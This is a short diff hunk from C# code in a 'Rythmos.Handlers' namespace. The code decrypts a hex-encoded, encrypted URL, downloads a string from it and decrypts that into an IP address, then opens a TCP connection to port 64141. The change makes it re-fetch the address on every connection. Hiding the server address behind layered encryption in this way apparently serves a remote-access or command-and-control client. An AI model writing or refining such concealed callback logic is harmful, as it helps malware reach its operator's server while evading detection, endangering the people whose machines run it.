@@ -216,7 +216,7 @@ namespace Rythmos.Handlers
                     Client.ReceiveTimeout = 0;
                     Client.SendTimeout = 120000;
                     var Token = new CancellationTokenSource(TimeSpan.FromSeconds(3));
-                    if (IP is null) using (var Web = new HttpClient()) IP = await Decrypt(Get_Bytes(await Web.GetStringAsync(await Decrypt(Get_Bytes("0E-F0-04-57-9B-AB-A9-A5-7D-8B-07-C1-64-40-0C-93-C9-04-75-D0-C6-C9-51-A1-DD-13-1A-46-51-49-60-FC-12-ED-68-11-66-C9-9C-BB-09-F9-2E-F6-B5-8B-86-7E-6A-AF-04-1C-2A-E5-CF-85-66-CB-8C-E2-CF-07-DB-4D-C7-A1-6E-39-75-25-6A-2F-1E-23-16-E1-B9-E8-C0-00"), "Rythmos"))), "Rythmos");
+                    using (var Web = new HttpClient()) IP = await Decrypt(Get_Bytes(await Web.GetStringAsync(await Decrypt(Get_Bytes("0E-F0-04-57-9B-AB-A9-A5-7D-8B-07-C1-64-40-0C-93-C9-04-75-D0-C6-C9-51-A1-DD-13-1A-46-51-49-60-FC-12-ED-68-11-66-C9-9C-BB-09-F9-2E-F6-B5-8B-86-7E-6A-AF-04-1C-2A-E5-CF-85-66-CB-8C-E2-CF-07-DB-4D-C7-A1-6E-39-75-25-6A-2F-1E-23-16-E1-B9-E8-C0-00"), "Rythmos"))), "Rythmos");
                     if (IP is null) return;
                     if (IP.Length == 0) return;
                     await Client.ConnectAsync(IPAddress.Parse(IP), 64141, Token.Token);
